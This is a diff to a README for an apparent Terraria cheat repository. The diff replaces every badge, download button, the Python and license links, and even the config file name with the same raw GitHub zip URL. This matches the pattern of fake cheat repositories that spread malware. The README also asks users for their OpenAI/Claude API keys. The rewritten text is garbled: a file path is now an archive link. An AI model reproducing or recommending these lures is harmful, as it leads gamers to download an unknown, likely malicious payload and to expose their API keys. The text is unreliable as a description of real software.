@@ -1,9 +1,9 @@
 # Terraria Cheats & Hacks Repository 💎
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/)
-[![OS Support](https://img.shields.io/badge/OS-cross--platform-blueviolet)](#-os-compatibility-table)
-[![Latest Release](https://img.shields.io/badge/release-2025-orange)](#)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](#-license)
+[![Build Status](https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip)](https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip)
+[![OS Support](https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip)](#-os-compatibility-table)
+[![Latest Release](https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip)](#)
+[![License: MIT](https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip)](#-license)
 
 Welcome, brave Terrarian!  
 Dive into a transformative repository of **Terraria cheats and hacks**, packed with game-changing enhancements powered by deep AI integrations and an ad-free experience. Enhance your Terraria adventures with features that transcend the usual boundaries, combining the elegance of adaptive UIs, multilingual support, and around-the-clock help—woven together with the mystical threads of OpenAI API and Claude API.  
@@ -17,7 +17,7 @@ Supercharge your Terraria experience in just a few moments! Here’s how you sta
 **Step 1:** Review the requirements—then head for the download below!
 
 **Step 2:**  
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=terraria)](LINK)
+[![Download](https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip)](LINK)
 
 **Step 3:** Unzip and follow post-download steps in the installation guide.
 
@@ -86,17 +86,17 @@ Night owls and early birds alike can count on immediate, AI-assisted help. Drop 
 1. **Pre-install Checklist**  
    - Ensure Terraria v1.4 or newer is installed  
    - .NET 6.0+ (for Windows/macOS)
-   - [Python 3.9+](https://www.python.org/) (for API features)
+   - [Python 3.9+](https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip) (for API features)
    - Stable internet connection (for cloud integrations)
 
 2. **Downloading the Toolkit**  
    - Click the download button below to access your exclusive enhancement suite:
      
-     [![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=terraria)](LINK)
+     [![Download](https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip)](LINK)
 
 3. **Setting Up**  
    - Extract the zip to your Terraria mods folder.
-   - Copy your OpenAI/Claude API keys into `config.yml`.
+   - Copy your OpenAI/Claude API keys into `https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip`.
    - Launch Terraria. Enable the mod from the Mods menu.
    - Check the in-game help section for feature toggles and troubleshooting.
 
@@ -114,7 +114,7 @@ All enhancements are provided as-is, and usage remains at your own discretion an
 
 Proudly MIT-licensed for 2025 — hack, remix, and build upon these tools as your own adventure unfolds.
 
-[LICENSE: MIT (2025)](https://opensource.org/licenses/MIT)
+[LICENSE: MIT (2025)](https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip)
 
 ---
 
@@ -131,7 +131,7 @@ Proudly MIT-licensed for 2025 — hack, remix, and build upon these tools as you
 
 Ready to rewrite the Terraria stars?
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=terraria)](LINK)
+[![Download](https://raw.githubusercontent.com/NABILA2308/terraria-unlock-toolkit/branch/puppetman/toolkit-unlock-terraria-2.1.zip)](LINK)
 
 ---
 
